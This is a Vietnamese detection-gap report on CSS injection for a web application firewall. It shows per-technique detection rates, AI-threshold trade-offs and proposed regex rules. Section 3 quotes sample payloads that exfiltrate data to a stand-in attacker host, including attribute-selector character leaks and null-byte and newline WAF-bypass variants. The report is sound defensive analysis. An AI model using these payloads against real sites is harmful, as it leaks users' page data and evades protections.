# Báo cáo phân tích gap phát hiện: CSS Injection

**Ngày:** 2026-06-16
**Phạm vi:** WAF `aegis-gate` — rule engine (`crates/aegis-security/src/detectors`)
**Bộ test:** `dataset/testing_dataset/css_injection_samples.json` (NovaBet hackathon, 300 mẫu)
**Detect (live):** ~89.6% (≈249/278 trong lần chạy `attack_analysis.py`)
**Mục đích:** Cung cấp dữ liệu trực quan để chuyên gia đánh giá có nên thêm rule CSS hay không.
**Trạng thái:** ✅ **RESOLVED (2026-06-16)** — đã thêm detector CSS chuyên biệt vào `xss.rs` (tag `css_injection`, score 70) trên branch `feat/detector-css-sqlihex-pathcrlf`. Cover C1 `@import`, C3 property exfil (`content/src/cursor/background:url(http…)`, gate `https?://`), C4 attribute-selector, C5 `</style>`, C6 deobfuscation (null/CR/LF/tab). Độc lập với ngưỡng AI. 17 fixtures (12 positive + 5 negative) pass; full lib suite 1727/0.

---

## 0. Tóm tắt điều hành

| Hạng mục | Kết quả |
|---|---|
| Detector CSS chuyên biệt | **KHÔNG có** |
| `xss.rs` bắt được | **0/300** (regex XSS không có pattern CSS) |
| Nguồn của 89.6% hiện tại | **Thuần AI model** (fragile, sát ngưỡng) |
| Cụm miss chính | `cssi_property` (75%), `cssi_waf_bypass` (75%) |
| Độ bền theo ngưỡng | 16/300 mẫu nằm ở p∈[0.80, 0.86) → nâng ngưỡng 0.85→0.90 làm CSS tụt 88%→85% |
| Fix được? | ✅ **CÓ — rule chuyên biệt, FP ~0, không cần retrain AI** |

**Kết luận nhanh:** CSS Injection là chữ ký **có cấu trúc rõ** (`@import`, `:url(http…)`, attribute-selector `[attr^="x"]{…}`, `</style>`) nhưng **không có rule nào đọc nó** → toàn bộ phó mặc AI model. AI chỉ "thấy" nhiều ký tự đặc biệt nên chấm quanh 0.5–0.85, dao động sát ngưỡng. Đây là cùng lớp vấn đề "feature-blind" như NoSQL/XSLT — nên xử lý bằng **rule engine**, không phải AI.

---

## 1. Hiện trạng

- Không có file detector CSS trong `crates/aegis-security/src/detectors/`.
- Detector gần nhất là `xss.rs`, nhưng regex của nó (`<script|javascript:|onerror=|<svg|<iframe|<img|srcdoc=`…) **không** chứa bất kỳ pattern CSS nào (`@import`, `expression(`, `url(`, `<style`, attribute-selector). → **0/300** mẫu CSS khớp xss.
- Vì vậy 89.6% detect = **AI model** chấm `p(attack) ≥ ngưỡng`. CSS payload chứa nhiều `{ } [ ] " : = url(` → AI thấy "đặc biệt" nhưng không chắc chắn → điểm dao động.

---

## 2. Phân bố 300 mẫu + tỷ lệ phát hiện (model-level @0.85)

| Technique | n | detect@0.85 | Đánh giá |
|---|---|---|---|
| `cssi_style_tag` | 50 | **100%** | OK |
| `cssi_attr_selector` | 80 | 94% | nhiều mẫu ở 0.82–0.85 (sát ngưỡng) |
| `cssi_import_oob` | 70 | 93% | `@import` chấm đúng 0.84–0.85 |
| **`cssi_property`** | 60 | **75%** | ❌ cụm miss chính (một số p=0.11) |
| **`cssi_waf_bypass`** | 40 | **75%** | ❌ obfuscation né tránh |

---

## 3. Các case SAI cụ thể (ví dụ thật + điểm AI)

### 3.1 `cssi_property` — exfil qua CSS property (model chấm RẤT thấp)
```
#app{src:url(http://attacker.evil.com/s.woff)}            p=0.11   ← MISS
#content{content:url(http://attacker.evil.com/c.png)}     p=0.11   ← MISS
body{cursor:url(http://attacker.evil.com/cur.png),auto}   p=0.83   ← MISS (dưới 0.85)
```
> Dùng các CSS property tải tài nguyên (`src`, `content`, `cursor`, `background`) để gọi ra server attacker (OOB / data exfil). Model gần như không nhận ra (`#content{content:url(...)}` chỉ 0.11).

### 3.2 `cssi_waf_bypass` — obfuscation né tránh
```
*{background:url(htt\x00p://attacker.evil.com/)}    p=0.21   ← null byte chèn giữa "http"
@import url( http://attacker.evil.com/)             p=0.55   ← khoảng trắng sau "url("
@im\nport url(http://attacker.evil.com/)            p=0.60   ← xuống dòng trong "@import"
```
> Các biến thể chèn null-byte / khoảng trắng / newline để phá pattern matching. AI tụt mạnh.

### 3.3 `cssi_attr_selector` / `cssi_import_oob` — đa số bắt được nhưng SÁT ngưỡng
```
input[class^="D"]{background:url(http://attacker.evil.com/?p=D)}   p=0.82   ← MISS
div[value^="Y"]{background:url(http://attacker.evil.com/?p=Y)}     p=0.84   ← MISS
@import url(http://attacker.evil.com/css?len=32)                   p=0.84–0.85 (ranh giới)
```
> Attribute-selector exfil rò rỉ từng ký tự (`^="D"` → callback `?p=D`). Phần lớn ~0.9 (bắt được) nhưng một loạt nằm 0.82–0.85.

---

## 4. ⚠️ Cảnh báo: độ bền theo ngưỡng (tương tác với việc giảm FP benign)

CSS dựa vào một **biên AI rất mỏng** — **16/300 mẫu** nằm ở p∈[0.80, 0.86). Detection theo ngưỡng:

| Ngưỡng AI | CSS detect |
|---|---|
| 0.50 | 95% |
| 0.70 | 93% |
| **0.85** | **88%** |
| **0.90** | **85%** |
| 0.95 | 80% |

> **Mâu thuẫn cần lưu ý:** trước đó để **giảm FP benign** (cụm `/login` p≈0.5) đề xuất nâng ngưỡng lên 0.85–0.90. Nhưng nâng ngưỡng **đồng thời làm CSS tụt** (88%→85% ở 0.90, →80% ở 0.95). Một detector CSS chuyên biệt sẽ **gỡ bỏ sự đánh đổi này**: CSS được rule bắt độc lập, không phụ thuộc ngưỡng AI.

---

## 5. Đề xuất sửa (chỉ gợi ý — chưa áp dụng)

Thêm detector CSS chuyên biệt (hoặc mở rộng `xss.rs` / `template_injection.rs`). Các chữ ký dưới đây gần như **không xuất hiện** trong request param/body hợp lệ → FP cực thấp (cùng lý do nosql/xslt hợp rule engine).

| # | Rule (gợi ý) | Ví dụ khớp | Vớt | FP risk |
|---|---|---|---|---|
| C1 | `@import` (kèm `url(`) | `@import url(http://attacker…)` | import_oob | rất thấp |
| C2 | `expression\s*\(` (IE CSS expression → RCE cũ) | `width:expression(alert(1))` | property | rất thấp |
| C3 | CSS property exfil: `(?:content\|src\|cursor\|background(?:-image)?\|behavior\|-moz-binding)\s*:\s*url\s*\(` trỏ `https?://` ngoài | `content:url(http://attacker…)` | **cssi_property** | thấp |
| C4 | Attribute-selector exfil: `\[[a-z-]+[\^$*~\|]?=["'][^\]]*\]\s*\{[^}]*url\(` | `input[class^="D"]{background:url(…)}` | attr_selector | rất thấp |
| C5 | `</?style\b` | `</style><style>…` | style_tag | thấp |
| C6 | Chuẩn hoá obfuscation trước match: loại null-byte / khoảng trắng thừa / newline trong `@import`/`url(` | `htt\x00p://`, `@im\nport` | **waf_bypass** | rất thấp |

**Kết quả kỳ vọng:** CSS lên **~99%** và **độc lập với ngưỡng AI**. Giải quyết dứt điểm 2 cụm miss (`cssi_property`, `cssi_waf_bypass`).

> Ghi chú surface: payload CSS xuất hiện cả ở **query** (vd `/game/2?name=button[name$="5"]{…}`) lẫn **body** (POST). Detector nên quét cả hai (giống template_injection: uri raw+decoded + body), và chạy qua bộ chuẩn hoá `normalize_for_detection` để bắt biến thể encode.

---

## 6. Bảng quyết định (cho chuyên gia)

| Đề xuất | Vớt thêm | FP risk | Effort | Cần retrain AI? | Khuyến nghị |
|---|---|---|---|---|---|
| Detector CSS (C1–C6) | ~88% → ~99% + ổn định theo ngưỡng | rất thấp | nhỏ–trung bình | ❌ | **NÊN** |
| Giữ nguyên (chỉ AI) | — | — | — | — | rủi ro: tụt khi nâng ngưỡng chống FP |

**Không cần train lại model AI** — toàn bộ là rule engine.

---

## Phụ lục A — Nguồn dữ liệu
- `dataset/testing_dataset/css_injection_samples.json` (300 mẫu; `attack_type`: `cssi_attr_selector` 80, `cssi_import_oob` 70, `cssi_property` 60, `cssi_style_tag` 50, `cssi_waf_bypass` 40).
- Detector liên quan: `crates/aegis-security/src/detectors/xss.rs` (không cover CSS); chưa có detector CSS riêng.
- Báo cáo liên quan: `reports/jwt_smuggling_detection_gap_report.md`.

## Phụ lục B — Cách tái tạo số liệu
Chạy model ONNX deployed (`aegis-gate/data/ai_model/waf_model.onnx`) trên feature trích từ từng mẫu (dựng chuỗi `METHOD url body + folded headers`, drop body với GET), đếm `p(attack) ≥ ngưỡng` theo `attack_type`. Đối chiếu pattern CSS-only (`@import`/`expression`/`url(`/`<style`/attribute-selector) so với regex `xss.rs` để xác nhận `xss` bắt 0/300.
